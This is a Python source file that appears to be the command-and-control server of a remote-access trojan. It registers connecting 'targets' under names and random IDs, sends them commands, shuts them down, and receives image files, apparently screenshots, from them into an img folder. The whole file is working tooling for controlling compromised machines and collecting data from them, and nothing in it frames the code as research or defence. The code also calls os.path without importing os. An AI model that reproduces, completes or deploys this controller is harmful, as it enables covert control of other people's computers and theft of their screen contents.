import socket
import sys
from colors import *
import struct
from id_handler import *
import struct

DEFAULT_TARGET_COUNT = 2

class Server:
    def __init__(self, target_count=DEFAULT_TARGET_COUNT):
        self.serverPort_ = 0
        self.serverAddress_ = ""
        self.serverSocket_ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.targetCount_ = target_count
        self.serverSocket_.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.runProgram_ = True
        self.target_socket_db = {}
        self.id_target_db = {}
    def __del__(self):
        self.serverSocket_.close()
        for clientSocket in self.target_socket_db.values():
            clientSocket.close()
    def set(self, ip_address, port):
        self.serverPort_ = port
        self.serverAddress_ = ip_address
    def define_target(self, __target):
        return self.target_socket_db[__target]

    def shut_down(self):
        for clientSocket in self.target_socket_db.values():
            clientSocket.send("0".encode())
        self.runProgram_ = False

    def send_command(self, command, target):
        clientSocket = self.define_target(target)
        clientSocket.send(command.encode())

    def receive_image_length(self, target):
        clientSocket = self.define_target(target)
        data = clientSocket.recv(4)
        if len(data) < 4:
            red("Failed to receive image length")
            return -1
        return struct.unpack('>I', data)[0]
    
    def receive_image(self, file_index, target):
        clientSocket = self.define_target(target)
        image_length = self.receive_image_length(target)
        if image_length < 0:
            return False
        else:
            green(f"Image length received: {image_length}")
        buf = b''
        if not os.path.exists("img"):
            os.makedirs("img")

        while len(buf) < image_length:
            data = clientSocket.recv(image_length - len(buf))
            if not data:
                break
            buf += data
        
        if len(buf) != image_length:
            red("Failed to receive image")
            return False
        img = open(f"img/{file_index}.png", "wb")
        img.write(buf)
        img.close()
        green(f"Image received and saved as img/{file_index}.png")
        return True

    def start(self):
        read_ids(self.id_target_db)

        self.serverSocket_.bind((self.serverAddress_, self.serverPort_))    
        self.serverSocket_.listen(self.targetCount_)
        green(f"Server started on {self.serverAddress_}:{self.serverPort_}")
        yellow("Waiting for connection...")

        while self.runProgram_:
            clientSocket, clientAddress = self.serverSocket_.accept()
            green(f"Connection established with {clientAddress}")
            # Receive first the flag data from the client
            flag = clientSocket.recv(1).decode()
            
            if flag == "0": # Target is new. Later needs to be changed to a more secure way
                
                yellow(f"New target connected. Info: {clientAddress} ")
                yellow("Enter a target name for the new client (q to decline)")
                target = input("Enter a target name for the new client: ")
                
                if target == "q": # If the user declines the connection
                    red("Connection declined")
                    clientSocket.send("0".encode())
                    clientSocket.close()
                    continue

                # Send ack flag to verify
                clientSocket.send("1".encode())
                # Genereate a custom target string that will correspond to the client
                new_id = generate_random_id()
                clientSocket.send(new_id.encode())
                self.id_target_db[new_id] = target
                self.target_socket_db[target] = clientSocket
                green(f"New target {target} with the ID {new_id} added to the database")

            elif flag == "1": # If the client is not new
                id = clientSocket.recv(16).decode() # Receive the ID of the client
                out_ =  verify_id(id, self.id_target_db) # Verify the ID
                
                if out_ == False:
                    red("ID verification failed!")
                    clientSocket.send("0".encode())
                    clientSocket.close()
                    continue
                else:
                    green("ID verification successful")
                    clientSocket.send("1".encode())
                    self.target_socket_db[self.id_target_db[id]] = clientSocket
            else:
                red("Invalid flag received")
                clientSocket.close()
                continue